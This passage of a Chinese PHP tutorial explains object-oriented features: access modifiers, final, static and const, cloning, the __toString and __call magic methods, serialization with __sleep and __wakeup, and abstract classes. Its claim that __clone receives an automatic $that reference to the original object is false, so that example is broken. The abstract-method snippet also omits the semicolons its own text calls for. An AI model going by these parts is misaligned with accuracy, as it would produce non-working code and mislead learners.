$this-&gt;printHello();                                        //访问父类中受保护的方法</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$subObj=new MyClass2();          //初例化出子类对象</span><br><span class="line">	$subObj-&gt;useProperty();            //调用子类对象中的方法实现对父类保护的成员访问</span><br><span class="line">     	echo $subObj-&gt;var1;               //试图访问类中受保护的成员，结果出错</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h2><span id="常见的关键字和魔术方法">常见的关键字和魔术方法</span></h2><h3><span id="final关键字的应用">final关键字的应用</span></h3><p>在PHP5中新增加了final关键字，它可以夹在类或类中方法前。但不能使用final标识成员属性，虽然final有常量的意思，但是PHP中定义常量是使用define()函数来完成。<br>final关键字的作用</p>
<ul>
<li>使用final标识的类，不能被继承</li>
<li>在类中使用final标识的成员方法，在子类中不能被覆盖</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class MyClass &#123;                //声明一个类MyClass作为父类，在类中只声明一个成员方法</span><br><span class="line">		final function fun() &#123;       //声明一个成员方法并使用final标识，则不能在子类中覆盖</span><br><span class="line">			//方法体中的内容略</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	class MyClass2 extends MyClass &#123; //声明继承MyClass类的子类，在类中声明一个方法去覆盖父类中的方法</span><br><span class="line">		function fun() &#123;           //在子类中试图去覆盖父类中已被final标识的方法，结果出错</span><br><span class="line">			//方法体中的内容略</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;	</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="static和const关键字的使用">static和const关键字的使用</span></h3><h4><span id="static关键字">static关键字</span></h4><p>使用static关键字可以将类中的成员标识为静态的，即可以用来标识成员属性也可以标识成员方法。</p>
<p>类的静态属性非常类似于函数的全局变量。类中的静态成员是不需要对象而使用类名来直接访问的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">类名::静态成员属性名;			//在类的外部和成员方法中都可以使用这种方法访问静态成员属性</span><br><span class="line">类名::静态成员方法名();			//在类的外部的成员方法中都可以使用这个方法访问静态成员方法</span><br></pre></td></tr></table></figure></p>
<p>在类中声明的成员方法中，也可以使用关键字“self”来访问其他静态成员。因为静态成员是属于类的，而不属于任何对象，所以不能用$this来引用，可以使用self关键词。</p>
<p>如果在类的外部访问类中的静态成员，可以使用对象引用和使用类名访问，但通常选择使用类名来访问。如果在类内部的成员方法中访问其他的静态成员，通常使用self的形式去访问，最好不要直接用类名称。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class MyClass &#123;                 //声明一个MyClass类，用来演示如何使用静态成员</span><br><span class="line">		static $count;               //在类中声明一个静态成员属性count，用来统计对象被创建的次数</span><br><span class="line"></span><br><span class="line">		function __construct() &#123;      //每次创建一个对象就会自动调用一次这个构造方法</span><br><span class="line">			self::$count++;	       //使用self访问静态成员count，使其自增1</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		static function getCount() &#123;   //声明一个静态方法，在类外面直接使用类名就可以调用</span><br><span class="line">			return self::$count;     //在方法中使用self访问静态成员并返回</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	MyClass::$count=0;            //在类外面使用类名访问类中的静态成员，为其初使化赋值0</span><br><span class="line"></span><br><span class="line">	$myc1=new MyClass();         //通过MyClass类创建第一个对象，在构造方法中将count累加1</span><br><span class="line">	$myc2=new MyClass();         //通过MyClass类创建第二个对象，在构造方法中又为count累加1</span><br><span class="line">	$myc3=new MyClass();         //通过MyClass类创建第三个对象，在构造方法中再次为count累加1</span><br><span class="line">     </span><br><span class="line">	echo MyClass::getCount();      //在类外面使用类名访问类中的静态成员方法，获取静态属性的值 3</span><br><span class="line">     	echo $myc3-&gt;getCount();       //通过对象也可以访问类中的静态成员方法，获取静态属性的值 3</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h4><span id="const关键字">const关键字</span></h4><p>使用const关键字将类中的成员属性定义为常量，其访问的方式和静态成员一样，都是通过类名或者在成员方法中使用self关键字访问，也不能用对象来访问。标识为常量的属性是只读的，不能重新赋值，如果在程序中试图改变它的值，则会出现错误。所以在声明常量时一定要给初值，因为没有其他方式后期为常量赋值。注意，使用const是声明的常量名称前不要使用“$”符号，而且常量名称通常都是大写的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class MyClass &#123;   //声明一个MyClass类，在类中声明一个常量，和一个成员方法</span><br><span class="line">		 const CONSTANT = &apos;CONSTANT value&apos;;     //使用const声明一个常量，并直接赋上初使值</span><br><span class="line"></span><br><span class="line">   		 function showConstant() &#123;                 //声明一个成员方法并在其内部访问本类中的常量</span><br><span class="line">       			 echo  self::CONSTANT.&quot;&lt;br&gt;&quot;;   //使用self访问常量，注意常量前不要加“$”</span><br><span class="line">   		 &#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	echo MyClass::CONSTANT . &quot;&lt;br&gt;&quot;;             //在类外部使用类名称访问常量，也不要加”$”</span><br><span class="line">	$class = new MyClass();                        //通过类MyClass创建一个对象引用$class</span><br><span class="line">	$class-&gt;showConstant();                        //调用对象中的方法</span><br><span class="line">	// echo $class::CONSTANT;                     //通过对象名称访问常量是不允许的</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="克隆对象">克隆对象</span></h3><p>在PHP中使用“clone”关键词克隆对象，克隆出一个完全一样的对象，克隆以后，原来和副本两个对象完全独立互不干扰。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class Person &#123;    //声明类Person，并在其中声明了三个成员属性，一个构造方法以及一个成员方法</span><br><span class="line">		private $name;     //第一个私有成员属性$name用于存储人的名子</span><br><span class="line">		private $sex;       //第二个私有成员属性$sex用于存储人的性别</span><br><span class="line">		private $age;       //第三个私有成员属性$age用于存储人的age</span><br><span class="line"></span><br><span class="line">		function __construct($name=&quot;&quot;, $sex=&quot;&quot;, $age=1) &#123;  //构造方法在对象诞生时为成员属性赋初值</span><br><span class="line">			$this-&gt;name=$name;</span><br><span class="line">			$this-&gt;sex=$sex;</span><br><span class="line">			$this-&gt;age=$age;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		function say()  &#123;       //一个成员方法用于打印出自己对象中全部的成员属性值</span><br><span class="line">			echo &quot;我的名子叫：&quot;.$this-&gt;name.&quot; 性别：&quot;.$this-&gt;sex.&quot; 我的年龄是：&quot;.$this-&gt;age.&quot;&lt;br&gt;&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$p1=new Person(&quot;张三&quot;, &quot;男&quot;, 20);   //创建一个对象并通过构造方法为对象中所有成员属性赋初值</span><br><span class="line">	$p2=clone $p1;                   //使用clone关键字克隆（复制）对象，创建一个对象的副本</span><br><span class="line">    	 // $p3=$p1                       //这不是复制对象，而是为对象多复制出一个访问该对象的引用</span><br><span class="line">	$p1-&gt;say();                      //调用原对象中的说话方法，打印原对象中的全部属性值</span><br><span class="line">	$p2-&gt;say();                      //调用副本对象中的说话方法，打印出克隆对象的全部属性值</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>如果需要为克隆后的副本对象在克隆是重新为成员属性赋初值，则可以在类中声明一个魔术方法clone()。该方法是在对象克隆时自动调用的，所以就可以通过此方法为克隆后的副本重新初始化。__clone()方法不需要任何参数，该方法中自动包含$this和$that两个对象的引用，$this是副本对象的引用，而$that则是原本对象的引用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class Person &#123;    //声明类Person，并在其中声明了三个成员属性，一个构造方法以及一个成员方法</span><br><span class="line">		private $name;     //第一个私有成员属性$name用于存储人的名子</span><br><span class="line">		private $sex;       //第二个私有成员属性$sex用于存储人的性别</span><br><span class="line">		private $age;       //第三个私有成员属性$age用于存储人的age</span><br><span class="line"></span><br><span class="line">		function __construct($name=&quot;&quot;, $sex=&quot;&quot;, $age=1) &#123;  //构造方法在对象诞生时为成员属性赋初值</span><br><span class="line">			$this-&gt;name=$name;</span><br><span class="line">			$this-&gt;sex=$sex;</span><br><span class="line">			$this-&gt;age=$age;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		function __clone() &#123;     //声明此方法则在对象克隆时自动调用，用来为新对象重新赋值</span><br><span class="line">			$this-&gt;name=&quot;我是&quot;.$that-&gt;name.&quot;的副本&quot;;  //为副本对象中的name属性重新赋值</span><br><span class="line">			$this-&gt;age=10;                          //为副本对象中的age属性重新赋值</span><br><span class="line">		&#125;		</span><br><span class="line"></span><br><span class="line">		function say()  &#123;       //一个成员方法用于打印出自己对象中全部的成员属性值</span><br><span class="line">			echo &quot;我的名子叫：&quot;.$this-&gt;name.&quot; 性别：&quot;.$this-&gt;sex.&quot; 我的年龄是：&quot;.$this-&gt;age.&quot;&lt;br&gt;&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$p1=new Person(&quot;张三&quot;, &quot;男&quot;, 20);   //创建一个对象并通过构造方法为对象中所有成员属性赋初值</span><br><span class="line">	$p2=clone $p1;                   //使用clone克隆（复制）对象，并自动调用类中的__clone()方法 </span><br><span class="line">    	$p1-&gt;say();                      //调用原对象中的说话方法，打印原对象中的全部属性值</span><br><span class="line">	$p2-&gt;say();                      //调用副本对象中的说话方法，打印出克隆对象的全部属性值</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="类中通用的方法__tostring">类中通用的方法__toString()</span></h3><p>魔法方法__toString()是快速获取对象的字符串表示的最便捷的方式，是在直接输出对象引用时自动调用的方法。通常在此方法中返回的字符串是使用对象中多个属性值连接而成的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class TestClass &#123;                 //声明一个测试类，在类中声明一个成员属性和一个__toString()方法</span><br><span class="line">   		private $foo;                //在类中声明的一个成员方法</span><br><span class="line"></span><br><span class="line">    		function __construct($foo) &#123;  //通过构造方法传值为成员属性赋初值</span><br><span class="line">        		$this-&gt;foo = $foo;      //为成员属性赋值</span><br><span class="line">   		&#125;</span><br><span class="line">  </span><br><span class="line">		public function __toString() &#123;  //在类中定义一个__toString方法 </span><br><span class="line">        		return $this-&gt;foo;       //返回一个成员属性$foo的值</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$obj = new TestClass(&apos;Hello&apos;);     //创建一个对象并赋值给对象引用$obj</span><br><span class="line">	echo $obj;                     //直接输出对象引用则自动调用了对象中的__toString()方法输出Hello</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="通过__call方法处理错误调用">通过__call()方法处理错误调用</span></h3><p>在调用对象中不存在的方法时就会出现系统出错，然后程序退出不能继续执行。如果在类中添加一个魔术方法call()，则调用对象中不存在的方法时就会自动调用该方法，并且程序可以继续向下执行。可以通过在call()方法中的设置，提示用户调用的方法及需要的参数列表内容不存在。<strong>call()方法需要两个参数，第一个参数是调用不存在的方法时，接受这个不存在的方法的方法名，并将这个不存在的方法中，使用的参数列表形成数组传给</strong>call()方法中的第二个参数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class TestClass &#123;                 //声明一个测试类，在类中声明printHello()和__call()方法</span><br><span class="line">		function printHello() &#123;        //声明一个方法，可以让对象成功能调用</span><br><span class="line">			echo &quot;Hello&lt;br&gt;&quot;;       //执行时输出一条语句</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		function __call($functionName, $args) &#123;     //声明此方法用来处理调用对象中不存在的方法</span><br><span class="line">			echo &quot;你所调用的函数：&quot;.$functionName.&quot;(参数：&quot;;  //输出调用不存在的方法名</span><br><span class="line">			print_r($args);                                  //输出调用不存在的方法时的参数列表</span><br><span class="line">			echo &quot;)不存在！&lt;br&gt;\n&quot;;                         //输出符加的一些提示信息</span><br><span class="line">		&#125;	</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$obj=new TestClass();              //通过类TestClass实例化一个对象</span><br><span class="line">	$obj-&gt;myFun(&quot;one&quot;, 2, &quot;three&quot;);      //调用对象中不存在的方法，则自动调用了对象中的__call()方法</span><br><span class="line">	$obj-&gt;otherFun(8,9);               //调用对象中不存在的方法，则自动调用了对象中的__call()方法</span><br><span class="line">	$obj-&gt;printHello();                 //调用对象中存在的方法，可以成功调用</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="对象串行化">对象串行化</span></h3><p>对象通过写出描述自己状态的数值来记录自己，这个过程叫对象的串行化。串行化就是把整个对象转化为二进制字符串，有两种情况我们必须把对象串行化。</p>
<ul>
<li>对象需要在网络中传输时，将对象串行化化成二进制串后在网络中传输。</li>
<li>对象需要持久保存时，将对象串行化后写入文件或是数据库中。<br>使用serialize()函数来串行化一个对象，把对象转化为二进制的字符串。serialize()函数需要一个参数就是对象的引用名，返回值为一个对象被串行化后的字符串。serialize()返回的字符串含义模糊，一般我们不会解析这个串来得到对象的信息。<br>另一个是反串行化后转化的二进制字符串再转化为对象，我们使用unserialize()函数来反串行化一个对象。这个函数的参数即为serialize()函数的返回值，返回值当然是重新组织好的对象。</li>
</ul>
<p>class_Person.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class Person &#123;        //声明一个Person类，包含三个成员属性和一个成员方法</span><br><span class="line">		private $name;   //人的名子</span><br><span class="line">		private $sex;     //人的性别</span><br><span class="line">		private $age;     //人的年龄</span><br><span class="line">	</span><br><span class="line">		function __construct($name=&quot;&quot;, $sex=&quot;&quot;, $age=&quot;&quot;) &#123;   //构造方法为成员属性赋初值</span><br><span class="line">			$this-&gt;name=$name;</span><br><span class="line">			$this-&gt;sex=$sex;</span><br><span class="line">			$this-&gt;age=$age;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		function say()  &#123;       //这个人可以说话的方法, 说出自己的成员属性</span><br><span class="line">			echo &quot;我的名字叫：&quot;.$this-&gt;name.&quot; 性别：&quot;.$this-&gt;sex.&quot; 我的年龄是：&quot;.$this-&gt;age.&quot;&lt;br&gt;&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>serialize.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	require &quot;class_Person.php&quot;;                	//在本文件中包含Person类所在的脚本文件</span><br><span class="line">	$person=new Person(&quot;张三&quot;, &quot;男&quot;, 20);      	//能过Person类创建一个对象，对象的引用名为$person</span><br><span class="line">	$person_string=serialize($person);         	 //通过serialize函数将对象串行化，返一个字符串</span><br><span class="line">	file_put_contents(&quot;file.txt&quot;, $person_string);	 //将对象串行化后返回的字符串保存到file.txt文件中</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>unserialize.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	require &quot;class_Person.php&quot;;	               //在本文件中包含Person类所在的脚本文件</span><br><span class="line">	$person_string=file_get_contents(&quot;file.txt&quot;);  //将file.txt文件中的字符串读出来并赋给变量$person_string</span><br><span class="line">	$person=unserialize($person_string); 	       //进行反串行化操作，形成对象$person。</span><br><span class="line">	$person-&gt;say();                         	//调用对象中的say()方法，用来测试反串行化对象是否成功</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>在PHP5中还有两个魔术方法sleep()和wakeup()可以使用。在调用serialize()函数将对象串行化时，会自动调用对象中的sleep()方法，用来将对象中的部分成员串行化。在调用unserialize()函数反串行化对象时，则会自动调用对象中的__wakeup()方法，用来在二进制串重新组成一个对象时，为新对象中的成员属性重新初始化。<br>sleep()函数不需要接受任何参数，但需要返回一个数组，在数组中包含需要串行化的属性。未被包含在数组中的属性将在串行化被忽略。如果没有在类中声明sleep()方法，对象中的所有属性都将被串行化。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class Person &#123;        //声明一个Person类，包含三个成员属性和一个成员方法</span><br><span class="line">		private $name;   //人的名子</span><br><span class="line">		private $sex;     //人的性别</span><br><span class="line">		private $age;     //人的年龄</span><br><span class="line">	</span><br><span class="line">		function __construct($name=&quot;&quot;, $sex=&quot;&quot;, $age=&quot;&quot;) &#123;   //构造方法为成员属性赋初值</span><br><span class="line">			$this-&gt;name=$name;</span><br><span class="line">			$this-&gt;sex=$sex;</span><br><span class="line">			$this-&gt;age=$age;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		function say()  &#123;              //这个人可以说话的方法, 说出自己的成员属性</span><br><span class="line">			echo &quot;我的名子叫：&quot;.$this-&gt;name.&quot; 性别：&quot;.$this-&gt;sex.&quot; 我的年龄是：&quot;.$this-&gt;age.&quot;&lt;br&gt;&quot;;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		function __sleep() &#123;            //在类中添加此方法，在串行化时自动调用并返回数组</span><br><span class="line">			$arr=array(&quot;name&quot;, &quot;age&quot;);  //数组中的成员$name和$age将被串行化，成员$sex则被忽略</span><br><span class="line">			return($arr);              //返回一个数组</span><br><span class="line">		&#125; </span><br><span class="line">		</span><br><span class="line">		function __wakeup() &#123;          //在反串行化对象时自动调用该方法，没有参数也没有返回值</span><br><span class="line">			 $this-&gt;age = 40;         //在重新组织对象时，为新对象中的$age属性重新赋值</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$person1=new Person(&quot;张三&quot;, &quot;男&quot;, 20);        //通过Person类实例化对象，对象引用名为$person1</span><br><span class="line">	//把一个对象串行化，返一个字符串，调用了__sleep()方法,忽略没在数组中的属性$sex</span><br><span class="line">	$person_string=serialize($person1); </span><br><span class="line">	echo $person_string.&quot;&lt;br&gt;&quot;;                  //输出对象串行化的字符串</span><br><span class="line"> </span><br><span class="line">   	 //反串行化对象，并自动调用了__wakup()方法重新为新对象中的$age属性赋值</span><br><span class="line">	$person2=unserialize($person_string);          //反串行化对象形成对象$p2重新赋值$age为40</span><br><span class="line">	$person2-&gt;say();                           //调用新对象中say()方法输出的成员中已没有$sex属性了</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h2><span id="抽象类与接口">抽象类与接口</span></h2><h3><span id="抽象方法和抽象类">抽象方法和抽象类</span></h3><p>抽象方法就是没有方法体的方法，所谓的没有方法体是指在方法声明时没有花括号以及其中的内容，而是在声明方法时直接在方法后加上分号结束。另外在声明抽象方法时，还要使用关键字abstract来修饰。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">abstract function fun1()		//不能有花括号，就更不能有方法体中的内容了</span><br><span class="line">abstract function fun2()		//直接在方法名的括号后面加上分号结束，还要使用abstract修饰</span><br></pre></td></tr></table></figure></p>
<p>抽象类使用abstract关键字来修饰。在抽象类中可以有不是抽象的成员方法和成员属性，但访问权限不能使用private关键字修饰为私有的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	abstract class Person &#123;             //声明一个抽象类，要使用abstract关键字标识</span><br><span class="line">		protected $name;             //声明一个存储人的名子的成员</span><br><span class="line">		protected $country;           //声明一个存储人的国家的成员</span><br><span class="line">			</span><br><span class="line">	    	function __construct($name=&quot;&quot;, $country=&quot;china&quot;) &#123;  //构造方法用来创建对象并初使化成员属性</span><br><span class="line">			$this-&gt;name = $name;                      //为成员属性name在创建对象时赋初值</span><br><span class="line">			$this-&gt;country = $country;                  //为成员属性country在创建对象时赋初值</span><br><span class="line">		&#125;</span><br><span class="line"> </span><br><span class="line">		abstract function say();   //在抽象类中声明一个没有方法体的抽象方法，使用abstract关键字标识</span><br><span class="line">	</span><br><span class="line">		abstract function eat();   //在抽象类中声明另一个没有方法体的抽象方法，使用abstract关键字标识</span><br><span class="line">		</span><br><span class="line">		function run()&#123;         //在抽象类中可以声明正常的非抽象的方法</span><br><span class="line">			echo &quot;使用两条腿走路&lt;br&gt;&quot;;                //有方法体，输出一条语句</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>在抽象类中没有被实现的抽象方法，所以抽象类是不能被实例化的，即创建不了对象，也就是不能直接使用它。使用抽象类就包含了继承关系，它是为它的子类定义公共接口，将它的曹交给子类去遵守。当子类继承抽象类以后，就必须把抽象类中的抽象方法按照子类自己的需要去实现。子类必须把父类中的抽象方法全部都实现，否则子类中还存在抽象方法，所以还是抽象类，也不能实例化对象。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class ChineseMan extends Person &#123;     //声明一个类去继承抽象类Person</span><br><span class="line">		function say() &#123;                //将父类中的抽象方法覆盖，按自已的需求去实现</span><br><span class="line">			echo $this-&gt;name.&quot;是&quot;.$this-&gt;country.&quot;人，讲汉语&lt;br&gt;&quot;;      //实现的内容</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		function eat() &#123;                 //将父类中的抽象方法覆盖，按自已的需求去实现</span><br><span class="line">			echo $this-&gt;name.&quot;使用筷子吃饭&lt;br&gt;&quot;;                    //实现的内容</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	class Americans extends Person &#123;      //声明另一个类去继承抽象类Person</span><br><span class="line">		function say() &#123;                //将父类中的抽象方法覆盖，按自已的需求去实现</span><br><span class="line">			echo $this-&gt;name.&quot;是&quot;.$this-&gt;country.&quot;人，讲英语&lt;br&gt;&quot;;     //实现的内容</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		function eat() &#123;                //将父类中的抽象方法覆盖，按自已的需求去实现</span><br><span class="line">			echo $this-&gt;name.&quot;使用刀子和叉子吃饭&lt;br&gt;&quot;;              //实现的内容</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$chineseMan = new ChineseMan(&quot;高洛峰&quot;, &quot;中国&quot;);      //将第一个Person的子类实例化对象</span><br><span class="line">	$americans =new Americans(&quot;alex&quot;, &quot;美国&quot;);             //将第二个Person的子类实例化对象</span><br><span class="line"></span><br><span class="line">	$chineseMan-&gt;say();              //通过第一个对象调用子类中已经实例父类中抽象方法的say()方法</span><br><span class="line">	$chineseMan-&gt;eat();               //通过第一个对象调用子类中已经实例父类中抽象方法的eat()方法</span><br><span class="line"></span><br><span class="line">	$americans-&gt;say();               //通过第二个对象调用子类中已经实例父类中抽象方法的say()方法</span><br><span class="line">	$americans-&gt;eat();                //通过第二个对象调用子类中已经实例父类中抽象方法的eat()方法</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
